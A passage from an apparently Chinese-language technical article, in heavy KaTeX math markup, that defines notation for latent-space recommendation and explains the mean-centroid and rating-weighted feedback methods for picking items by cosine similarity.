style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.13em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<p><strong>符号定义：</strong></p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo>⋅</mo><mi>B</mi></mrow><annotation encoding="application/x-tex">A \cdot B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05017em;">B</span></span></span></span></span>：向量的点积。</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∥</mi><mi>A</mi><mi mathvariant="normal">∥</mi></mrow><annotation encoding="application/x-tex">\|A\|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">∥</span><span class="mord mathnormal">A</span><span class="mord">∥</span></span></span></span></span> 和 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∥</mi><mi>B</mi><mi mathvariant="normal">∥</mi></mrow><annotation encoding="application/x-tex">\|B\|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">∥</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord">∥</span></span></span></span></span>：向量的模长（即 L2 范数）。</li>
</ul>
</blockquote>
<h4 data-id="heading-15">使用相似性产生推荐</h4>
<p>给定用户 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span> 及其喜欢的物品集合，通过潜在空间中的向量运算可以推导出推荐结果。</p>
<p><strong>符号定义：</strong></p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">R</mi><mi>A</mi></msub></mrow><annotation encoding="application/x-tex">\mathcal{R}_A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathcal">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>：用户 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span> 已评分或交互过的物品集合。</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>x</mi></msub></mrow><annotation encoding="application/x-tex">v_x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>：物品 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">x</span></span></span></span></span> 在潜在空间中的特征向量，其中 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>∈</mo><msub><mi mathvariant="script">R</mi><mi>A</mi></msub></mrow><annotation encoding="application/x-tex">x \in \mathcal{R}_A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"/><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathcal">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>。</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span>：用户 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">A</span></span></span></span></span> 的关联向量集 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">{</mo><msub><mi>v</mi><mi>x</mi></msub><mo>∣</mo><mi>x</mi><mo>∈</mo><msub><mi mathvariant="script">R</mi><mi>A</mi></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{v_x \mid x \in \mathcal{R}_A\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">{</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">∣</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"/><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathcal">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">}</span></span></span></span></span>。</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>y</mi></msub></mrow><annotation encoding="application/x-tex">v_y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>：待预测物品 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></span> 的特征向量。</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>r</mi><mi>x</mi></msub></mrow><annotation encoding="application/x-tex">r_x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>：用户对物品 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">x</span></span></span></span></span> 的评分或反馈权重。</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>USim</mtext><mo stretchy="false">(</mo><mo>⋅</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\text{USim}(\cdot)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord">USim</span></span><span class="mopen">(</span><span class="mord">⋅</span><span class="mclose">)</span></span></span></span></span>：潜在空间中的相似度函数（如余弦相似度）。</li>
<li><strong><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>avg</mtext><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\text{avg}(A)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord">avg</span></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose">)</span></span></span></span></span></strong>：用户兴趣的中心向量，定义为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mi>n</mi></mfrac><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\frac{1}{n} \sum_{i=1}^{n} v_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1901em;vertical-align:-0.345em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8043em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>（其中 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mi mathvariant="normal">∣</mi><msub><mi mathvariant="script">R</mi><mi>A</mi></msub><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">n = |\mathcal{R}_A|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">∣</span><span class="mord"><span class="mord mathcal">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord">∣</span></span></span></span></span>）。</li>
</ul>
<p><strong>推荐生成策略：</strong></p>
<h5 data-id="heading-16">均值重心法</h5>
<p>假设用户喜欢的物品在潜在空间中具有聚类特性。通过取平均值，模型试图捕捉用户兴趣的最大公约数。寻找与用户交互历史平均位置最接近的物品。</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>y</mi><mo>∗</mo></msup><mo>=</mo><munder><mrow><mi mathvariant="normal">argmax</mi><mo>⁡</mo></mrow><mrow><mi>y</mi><mo>∈</mo><mtext>Items</mtext></mrow></munder><mrow><mo fence="true">(</mo><mtext>USim</mtext><mo stretchy="false">(</mo><msub><mi>v</mi><mi>y</mi></msub><mo separator="true">,</mo><mtext>avg</mtext><mo stretchy="false">(</mo><mi>A</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">y^* = \operatorname*{argmax}_{y \in \text{Items}} \left( \text{USim}(v_y, \text{avg}(A)) \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9331em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7387em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.8249em;vertical-align:-1.0749em;"/><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.4306em;"><span style="top:-2.1612em;margin-left:0em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">∈</span><span class="mord text mtight"><span class="mord mtight">Items</span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span><span class="mop"><span class="mord mathrm">argmax</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.0749em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord text"><span class="mord">USim</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord text"><span class="mord">avg</span></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mclose">))</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></div>
<p>均值重心法的优点在于计算极其简单，在线预测时只需一次向量搜索。但也容易受到“长尾”行为的影响。如果用户同时喜欢两种完全不同的东西（如：硬核科幻与浪漫喜剧），其重心可能落在空间中一个荒芜的中间区域，导致推荐出“平庸且不相关”的物品。</p>
<h5 data-id="heading-17">加权反馈法</h5>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><msub><mi mathvariant="script">R</mi><mi>A</mi></msub><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|\mathcal{R}_A|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">∣</span><span class="mord"><span class="mord mathcal">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord">∣</span></span></span></span></span>：用户交互过的<strong>物品总数</strong>。</li>
</ul>
<p>引入用户评分作为权重，<strong>提升高质量反馈的影响力</strong>。高评分或高频互动的物品在空间中对用户坐标的拉引力更强。这使得用户向量向其最满意的物品区域偏移。</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>y</mi><mo>∗</mo></msup><mo>=</mo><munder><mrow><mi mathvariant="normal">argmax</mi><mo>⁡</mo></mrow><mrow><mi>y</mi><mo>∈</mo><mtext>Items</mtext></mrow></munder><mrow><mo fence="true">(</mo><mtext>USim</mtext><mrow><mo fence="true">(</mo><msub><mi>v</mi><mi>y</mi></msub><mo separator="true">,</mo><mfrac><mrow><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><msub><mi mathvariant="script">R</mi><mi>A</mi></msub></mrow></munder><msub><mi>r</mi><mi>x</mi></msub><mo>⋅</mo><msub><mi>v</mi><mi>x</mi></msub></mrow><mrow><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><msub><mi mathvariant="script">R</mi><mi>A</mi></msub></mrow></munder><msub><mi>r</mi><mi>x</mi></msub></mrow></mfrac><mo fence="true">)</mo></mrow><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">y^* = \operatorname*{argmax}_{y \in \text{Items}} \left( \text{USim} \left( v_y, \frac{\sum_{x \in \mathcal{R}_A} r_x \cdot v_x}{\sum_{x \in \mathcal{R}_A} r_x} \right) \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9331em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7387em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"/><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.4306em;"><span style="top:-2.1612em;margin-left:0em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">∈</span><span class="mord text mtight"><span class="mord mtight">Items</span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"/><span><span class="mop"><span class="mord mathrm">argmax</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.0749em;"><span/></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">(</span></span><span class="mord text"><span class="mord">USim</span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">(</span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.54em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1786em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mtight"><span class="mord mathcal mtight">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3567em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1433em;"><span/></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.79em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1786em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mtight"><span class="mord mathcal mtight">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3567em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1433em;"><span/></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" 